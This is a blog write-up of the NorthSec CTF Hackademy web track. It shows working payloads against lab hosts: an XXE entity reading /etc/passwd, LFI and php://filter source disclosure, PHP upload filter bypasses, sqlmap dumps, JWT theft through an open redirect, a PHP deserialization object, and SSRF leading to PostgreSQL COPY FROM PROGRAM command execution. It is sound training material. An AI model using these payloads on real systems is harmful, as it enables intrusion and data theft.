---
layout: post
title: "Northsec Hackademy"
date: 2022-05-28
image: /will-hack-for-coffee/assets/images/nsec2022/hackademy.png
custom_css: terminal
---

{:.note}
Updated for Northsec 2023

What's worst then a half baked poorly written writeup? My writeup, of course! Just kidding but I've updated it so it will be easier to use. It's a beginner track so you want to try it by yourself first but sometimes if you've never seen the technique, reading the solution while doing it might be another great way to learn.

This year I participated again in NorthSec CTF. I had done the Hackademy track previously and had even done this writeup so I tought I had mastered this track. I let my teammates handle those challenges and when they asked me questions I redirected them to this post. But I saw that they were struggling to make sense of some parts. Even I had some difficulty explaining how I obtained some flags. We finally completed the track but NorthSec left the infrastructure in place for some times after the event, so I took the time to update my blog based on that experience. 

So hoping it's my final version, here is my update writeup for the Hackademy track:

# Table of contents

[Automatization](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#automatization)
[Inclusion](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#inclusion)
[Upload](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#file-upload)
[SQL](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#sql-injection)
[Open redirect](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#redirection)
[Serialize](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#serialization)
[Forgery](/will-hack-for-coffee/2022/05/28/northsec-hackademy.html#ssrf)

![Automatization 101](/will-hack-for-coffee/assets/images/nsec2022/automatization101.png){: #automatization .centered}

So the first site was under construction. Looking at the source code I found the first flag:
````
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
    </head>
    <body>
        <div class="container">
            Site is under construction...<!-- FLAG-7c343e260bad642afa1c589687b815b7 (1/2) -->
        </div>
    </body>
</html>
````

![Automatization 102](/will-hack-for-coffee/assets/images/nsec2022/automatization102.png){:.centered}

Looking at the robots.txt I found an hidden file:
````
User-agent: *
Disallow: secret-4e93a07c19d253e8.txt
````
Browsing to that hidden file I found the second flag:

````
FLAG-3564934ce48dd205525279f69be8a810 (2/2)
````

![Inclusion 101](/will-hack-for-coffee/assets/images/nsec2022/inclusion101.png){: #inclusion .centered}

![Inclusion website](/will-hack-for-coffee/assets/images/nsec2022/inclusion-website.png)

A classic local file inclusion exist on this site. The URL is:

<http://chal2.hackademy.ctf/?page=welcome.php>

What if I specified /etc/passwd instead of welcome.php? Well here is our trainer:
````
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
trainer:x:1001:1001:Trainer:FLAG-446fd3bcb4a9c08cd5cb25e113aaa1e5,,,,:/bin/false:/sbin/nologin
````

![Inclusion 102](/will-hack-for-coffee/assets/images/nsec2022/inclusion102.png){:.centered}

This challenge could be solved using [XML external entity injection (XXE)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). Hopefully an [enraged hacker](https://gitlab.com/sebast331-ctf/) reminded me of the technique. Looking at the source code:

![Inclusion 102 source code](/will-hack-for-coffee/assets/images/nsec2022/inclusion102-source.png)

I sent the AJAX request to my Burp Repeater tab:
![ajax request](/will-hack-for-coffee/assets/images/nsec2022/ajax-request.png)
![ajax request body](/will-hack-for-coffee/assets/images/nsec2022/ajax-request2.png)

 I then edited the body parameter so the content of the passwd file is shown through the ext variable on the website.
![XXE](/will-hack-for-coffee/assets/images/nsec2022/xxe.png):

Here is the code I used:
````
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>
````

![Inclusion 103](/will-hack-for-coffee/assets/images/nsec2022/inclusion103.png){:.centered}

For the next one, you need to look at the source code. PHP has a nice feature that allows you to convert a file to base64. In our case it will prevent index.php from being interpreted. So I tried this URL:

<http://chal2.hackademy.ctf/?page=php://filter/convert.base64-encode/resource=index.php>

It outputted a long base64 string. Decoding the resulting string I got the source code which included the flag:
````
<?php
    #FLAG-8f54c17252eb57ff6cf91f97828f3f54 (2/2)
    if(!isset($_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }

    $page = $_GET["page"];
    if(strpos($_GET["page"], "index.php") !== false && !preg_match("/.*=([.\/]*)?index.php$/", $_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }
?>
<!DOCTYPE html>
<html>
    <head>
    ...
````

![File upload 101](/will-hack-for-coffee/assets/images/nsec2022/upload101.png){: #file-upload .centered}

So here the challenges is to upload a php file while evading validation:

![File upload website](/will-hack-for-coffee/assets/images/nsec2022/file-upload.png)

If you check the source code you can see an hint:

![File upload hint](/will-hack-for-coffee/assets/images/nsec2022/file-upload-hint.png)

The challenge only seems to check if it contains php tag so you can use this basic PHP snippet (or feel free to use a real payload like a [reverse shell](https://www.revshells.com/)) and save it as reverse.jpg.php:
````
<?php echo 'Hello World'; ?> 
````
The file will be interpreted as PHP and the code could be executed. The validation probably only checked if the allowed extensions was in the filename.

![File upload 102](/will-hack-for-coffee/assets/images/nsec2022/upload102.png){:.centered}

For the second challenge you need to modify the Content-Type header for image/jpeg with the following value:

![Content-Type header](/will-hack-for-coffee/assets/images/nsec2022/content-type.png)

![File upload 103](/will-hack-for-coffee/assets/images/nsec2022/upload103.png){:.centered}

For the third challenge I submitted the same file and it warned me that the signature didn't match a JPEG file. So I used the [hexed.it website](https://hexed.it) and modified the [signature](https://en.wikipedia.org/wiki/List_of_file_signatures). 

![Hexed.it](/will-hack-for-coffee/assets/images/nsec2022/hexed.png)

The resulting forged file was uploaded (again modifying the Content-Type header).

![File upload 104](/will-hack-for-coffee/assets/images/nsec2022/upload104.png){:.centered}

For the fourth upload challenge I renamed the file to rev.png.php3 a less known but still valid PHP extension. The validation must have been a blacklist on .php extension.

![SQL injection 101](/will-hack-for-coffee/assets/images/nsec2022/sqli101.png){: #sql-injection .centered}

I previously suggested to a teammate that he could have used [sqlmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. Here is a command that worked for me:
````
└─$ sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
        ___
       __H__                                                                                         
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                             
|_ -| . [.]     | .'| . |                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                            
      |_|V...       |_|   https://sqlmap.org                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:53:09 /2022-05-20/

[22:53:09] [INFO] resuming back-end DBMS 'sqlite' 
[22:53:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: password=admin&username=admin' AND 1182=1182 AND 'RANU'='RANU

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: password=admin&username=admin' AND 4961=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'OrQH'='OrQH
---
[22:53:09] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[22:53:09] [WARNING] on SQLite it is not possible to get name of the current database
[22:53:09] [INFO] fetching tables for database: 'SQLite_masterdb'
[22:53:09] [INFO] fetching number of tables for database 'SQLite_masterdb'
[22:53:09] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:53:09] [INFO] retrieved: 2
[22:53:09] [INFO] retrieved: fl4G_1s_H3re
[22:53:13] [INFO] retrieved: users
[22:53:14] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)
[22:53:41] [INFO] fetching entries for table 'users'
[22:53:41] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[22:53:41] [INFO] retrieved: 1
[22:53:42] [INFO] retrieved: 1
[22:53:42] [INFO] retrieved: FLABbergasted!
[22:53:45] [INFO] retrieved: admin
Database: <current>
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | FLABbergasted! | admin    |
+----+----------------+----------+

[22:53:47] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/users.csv'                                             
[22:53:47] [INFO] retrieved: CREATE TABLE fl4G_1s_H3re (apprentice_flagTODO TEXT NOT NULL)
[22:54:03] [INFO] fetching entries for table 'fl4G_1s_H3re'
[22:54:03] [INFO] fetching number of entries for table 'fl4G_1s_H3re' in database 'SQLite_masterdb'
[22:54:03] [INFO] retrieved: 1
[22:54:03] [INFO] retrieved: FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection).
Database: <current>
Table: fl4G_1s_H3re
[1 entry]
+-----------------------------------------------------------------------------------------------------------------------------+
| apprentice_flagTODO                                                                                                         |
+-----------------------------------------------------------------------------------------------------------------------------+
| FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection). |
+-----------------------------------------------------------------------------------------------------------------------------+
...
````
We can see that sqlmap exfiltrated all the database and revealead the flag in the table fl4G_1s_H3re.

![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sqli102.png){:.centered}

From the previous challenge we know the admin password but if we try to login with it there is a mesage to try login bypass instead:

![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sqli-admin.png){:.centered}

Leaving the password field blank, here is the [injection](https://portswigger.net/web-security/sql-injection/union-attacks) I used:

![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sqli-bypass.png){:.centered}

It worked because the query returns one (empty) row.

![Redirect 101](/will-hack-for-coffee/assets/images/nsec2022/redirect101.png){: #redirection .centered}

I tought open redirect was a minor vulnerability? I browsed the site and there was two links:

![Open redirect 101](/will-hack-for-coffee/assets/images/nsec2022/open-redirect101.png)

Navigating the first link and looking at Burp I saw that there was a redirect containing a JWT (Jason Web Token):

![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)

You can use [jwt.io](https://jwt.io) to confirm it's a JWT and check what's inside the token:

![jwt.io](/will-hack-for-coffee/assets/images/nsec2022/jwt-io.png)

The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the NorthSec network so I redirected him there instead:

<http://chal5.hackademy.ctf/?sub_url=http://shell.ctf>

**Note: This year Apache was not installed on our server. No Apache, no problem! Just run this command before delivering your crafted url:**
````
apt install apache2
````

Looking at our server log:
````
...
root@ctn-shell:/var/log/apache2#cat access.log
...
9000:91a:201:cdba:216:3eff:fe01:b3fd - - [21/May/2022:05:56:49 +0000] "GET /?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUuaGFja2FkZW15LmN0ZlwvIiwiaWF0IjoxNjUzMTEyNjA5LCJuYmYiOjE2NTMxMTI2MDksImV4cCI6MTY1MzExMjkwOSwidXNlciI6IlVuZm9ydHVuYXRlIFBlbnRlc3RlciIsInJvbGUiOiJHcmFuZCBNYXN0ZXIgUGVudGVzdGVyIn0.Cv8ROC8pX7HMXwSnjgtYvQbqFVEc2xOqEz9dLiDnt0s HTTP/1.1" 200 11173 "-" "-"
````
You can see his JWT token. 

![Master JWT](/will-hack-for-coffee/assets/images/nsec2022/master-jwt.png)

Browse to:

<http://chal5.hackademy.ctf/?identity=(insert grand master JWT)>

and you will be redirected and logged in as the master.

![Grand master credentials](/will-hack-for-coffee/assets/images/nsec2022/grand-master-credentials.png)

![Serialize101](/will-hack-for-coffee/assets/images/nsec2022/serialize101.png){: #serialization .centered}

A simple Hello word! page with the source available. There is also weird **s** parameter that I will tamper with later.

![Serialize 101 website](/will-hack-for-coffee/assets/images/nsec2022/serialize101-website.png)

Looking at the source:
````
<?php
    if(isset($_GET["source"])){
        highlight_string(preg_replace("/(FLAG-[a-f0-9]{32})/", "FLAG-".str_repeat("x", 32), file_get_contents(__file__)));
        die();
    }
    class Hackademy{
        private $call = "WelcomeMessage";

        public function __construct() {

        }

        public function __wakeup(){
            $this->{$this->call}();
        }

        public function WelcomeMessage(){
            echo "Hello World!";
        }

        public function GiveMeFlagPrettyPlease(){
            echo "FLAG-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
        }
    }
?>
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    </head>
    <body>
        <div class="container">
            <a href="?source">Source here!</a><hr>
            <?php if(!isset($_GET["s"])){header("Location: ?s=".base64_encode(serialize(new Hackademy())));}else{unserialize(base64_decode($_GET["s"]));} ?>
        </div>
    </body>
</html>
````
The flag is in the source code but it's replaced by x if it's viewed from the link. It took me some time to understand this challenge even if I [ripped it from a friend](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/). PHP use the [serialize](https://www.php.net/manual/en/function.serialize.php) function so it can convert an object in a format that can be stored or transported. In this website, if the **s** parameter is not set it will serialize a new object based on the Hackademy class and redirect to the same page but setting **s** as the result. If the **s** parameter is set, it will dedcode the parameter and try to deserialize it. That will then automatically launch the __wakeup function which will execute the WelcomeMessage function. A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so let's run the code to see what it does:

````
└─$ cat original.php
<?php
    class Hackademy{
        private $call = "WelcomeMessage";

        public function __construct() {

        }

        public function __wakeup(){
            $this->{$this->call}();
        }

        public function WelcomeMessage(){
            echo "Hello World!";
        }

        public function GiveMeFlagPrettyPlease(){
            echo "FLAG-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
        }
    }
    $serialized = serialize(new Hackademy());
    echo $serialized;
    echo "\n"
?>
└─$ ~/serialize101$ php original.php 
O:9:"Hackademy":1:{s:15:"Hackademycall";s:14:"WelcomeMessage";}
````
What I will do is modify the class to assign the GiveMeFlagPrettyPlease function to the call property instead of WelcomeMessage (you can see that only the call property is stored in the object, please refer to [Portswigger Academy](https://portswigger.net/web-security/deserialization/exploiting#php-serialization-format) for a more thorough explanation of the serialized object representation). So here is my code:
````
<?php
    // Payload
    class Hackademy{
        private $call = "GiveMeFlagPrettyPlease";
    }   
    $serialized = serialize(new Hackademy());

    // Output
    echo "Serialized:\n";
    echo $serialized;
    echo "\n";
    echo "Encoded:\n";
    echo base64_encode($serialized);
    echo "\n";
?>
````
Ran it:
````
└─$ php serialize.php  
Serialized:
O:9:"Hackademy":1:{s:15:"Hackademycall";s:22:"GiveMeFlagPrettyPlease";}
Encoded:
Tzo5OiJIYWNrYWRlbXkiOjE6e3M6MTU6IgBIYWNrYWRlbXkAY2FsbCI7czoyMjoiR2l2ZU1lRmxhZ1ByZXR0eVBsZWFzZSI7fQ==
````
Then used that base64 string in the **s** parameter and got the flag:

![Serialize 101 flag](/will-hack-for-coffee/assets/images/nsec2022/serialized-flag.png)

Phew that was longer then expected, courage valiant wannabe hackers only three more flags to go!

![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf101.png){: #ssrf .centered}

This website allows you to send some commands like ping and such:

![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf-website.png){:.centered}

But you can also use any other protocol and obtain file located on the server and it will not be interpretated. By using this url, you will see some of the code behind:

**file:///var/www/html/api/api.php**
````
<?php 
    require_once("config.php");

    if(isset($_GET["run"])){
        $run = strtolower($_GET["run"]);
        if($run === "ping"){
            echo "Pong!";
            die();
        } elseif($run === "hello"){
            echo "World!";
            die();
        } elseif($run === "healthcheck"){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://".DATABASE_HOST.":".DATABASE_PORT."");
            curl_setopt($ch, CURLOPT_POSTFIELDS, "user=".DATABASE_USER."&password=".urlencode(DATABASE_PASSWORD));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $output = curl_exec($ch);
            curl_close($ch);
            echo $output;
            die();
        } else {
            echo "This command is not implemented in our system. Wait some more years and try again, young apprentice.";
            die();
        }
    }
````
 That config file looks interesting. Let's take a look at it:

![Server Side Request Forgery 101 flag](/will-hack-for-coffee/assets/images/nsec2022/ssrf101-flag.png)

So here is the first flag with some bonus database credentials:

![Server Side Request Forgery 102](/will-hack-for-coffee/assets/images/nsec2022/ssrf102.png){:.centered}

Here is another important file used by the Apache server:

````
file:///etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
    ServerName localhost
    DocumentRoot /var/www/html/api
</VirtualHost>

<VirtualHost *:8080>
    ServerName localhost
    DocumentRoot /var/www/html/database

    <Directory /var/www/html/database>
        Order deny,allow
        Deny from all
        Allow from ::1
        Allow from localhost
    </Directory>
</VirtualHost>
````
So that's where the database is but it can only be accessed locally from the server (try <http://chal7.hackademy.ctf:8080/> if you don't believe me). I was a bit confused for that part but an [enraged hacker (who is also a SQL genius)](https://www.youtube.com/watch?v=q95L-epzYnw) gently nudged me in the right direction. Let's take a look at the source code of the database webpage (**url=file:///var/www/html/database/index.php**):
````
<?php 
    if(isset($_POST['user'], $_POST['password'])) {
        try{
            $conn = new PDO("pgsql:host=localhost;port=5432;", $_POST['user'], $_POST['password'], array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } catch (PDOException $e){
            echo "You are not authorized to access this, get out!";
            die();
        }
        if(isset($_POST["query"])){
            try{
                $cursor = $conn->query($_POST["query"]);
                $results = $cursor->fetchall(PDO::FETCH_ASSOC);
                if(!empty($results)){
                    $columns = array_keys($results[0]);
                    echo implode(" | ", $columns)."\n";
                    foreach ($results as $key => $value) {
                        echo implode(" | ", $value)."\n";
                    }
                }
            } catch(PDOException $e) {
                echo "Seems like your query failed, try again young pentester!";
                die();
            }
        } else {
            echo "Yes, yes.. I'm alive. What is it?";
            die();
        }
    } else {
        echo "Only a real pentester can access the database.";
        die();
    }
````
We have the user and the password from the config file. We now know we can specify the query. So let's take a look at the default database table (we can guess it's a PostgreSQL database from the user):

![Server Side Request Forgery query](/will-hack-for-coffee/assets/images/nsec2022/ssrf-query.png)

Hmmm there is a table that looks interseting. Use that query to find the second flag:
````
user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
````

![Server Side Request Forgery 103](/will-hack-for-coffee/assets/images/nsec2022/ssrf103.png){:.centered}

In last year CTF, the flag was in a flag.txt located at the root folder so we lucked out getting it. This year this was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (maybe disable this on your production server?). But instead of logging in the database you use the query to create the table, copy your command and execute them. You can use those as query to execute command on the server:
````
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'ls /';
SELECT * FROM cmd_exec;
COPY cmd_exec FROM PROGRAM 'cat /flag_is_in_here_549e82c591d5b622.txt';
SELECT * FROM cmd_exec;
````
Be mindful that since I didn't drop the table after each command, all the previous command output will also be listed:

![Postgresql remote command execution](/will-hack-for-coffee/assets/images/nsec2022/ssrf-rce.png)

Looking at the root folder I listed the flag and read it. Congratulation and enjoy your newly acquired Hackademy Certified Ethical Hacker (CEH)!
